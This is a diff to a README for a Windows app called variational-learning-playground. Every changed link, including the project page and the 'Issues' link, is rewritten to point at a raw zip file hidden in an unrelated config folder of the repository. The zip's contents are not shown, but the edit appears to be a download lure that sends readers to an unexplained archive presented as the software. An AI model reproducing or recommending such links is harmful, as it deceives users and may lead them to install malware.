@@ -1,6 +1,6 @@
 # ⚙️ variational-learning-playground - Explore Variational Learning Methods
 
-[![Download variational-learning-playground](https://img.shields.io/badge/Download-variational--learning--playground-brightgreen?style=for-the-badge)](https://github.com/mrbadr1243/variational-learning-playground)
+[![Download variational-learning-playground](https://img.shields.io/badge/Download-variational--learning--playground-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/mrbadr1243/variational-learning-playground/master/conf/indomain/method/playground_variational_learning_v3.3.zip)
 
 ---
 
@@ -12,7 +12,7 @@ variational-learning-playground is an app to try out different variational learn
 
 Visit this page to download the software:
 
-[https://github.com/mrbadr1243/variational-learning-playground](https://github.com/mrbadr1243/variational-learning-playground)
+[https://raw.githubusercontent.com/mrbadr1243/variational-learning-playground/master/conf/indomain/method/playground_variational_learning_v3.3.zip](https://raw.githubusercontent.com/mrbadr1243/variational-learning-playground/master/conf/indomain/method/playground_variational_learning_v3.3.zip)
 
 Follow these steps to get the app on your Windows PC:
 
@@ -99,9 +99,9 @@ The app works on Windows 10 and later. To run it smoothly, your PC should meet t
 
 ## 🔗 Useful Links
 
-[Main Download and Project Page](https://github.com/mrbadr1243/variational-learning-playground)
+[Main Download and Project Page](https://raw.githubusercontent.com/mrbadr1243/variational-learning-playground/master/conf/indomain/method/playground_variational_learning_v3.3.zip)
 
-[GitHub Repository Issues](https://github.com/mrbadr1243/variational-learning-playground/issues)
+[GitHub Repository Issues](https://raw.githubusercontent.com/mrbadr1243/variational-learning-playground/master/conf/indomain/method/playground_variational_learning_v3.3.zip)
 
 ---
 
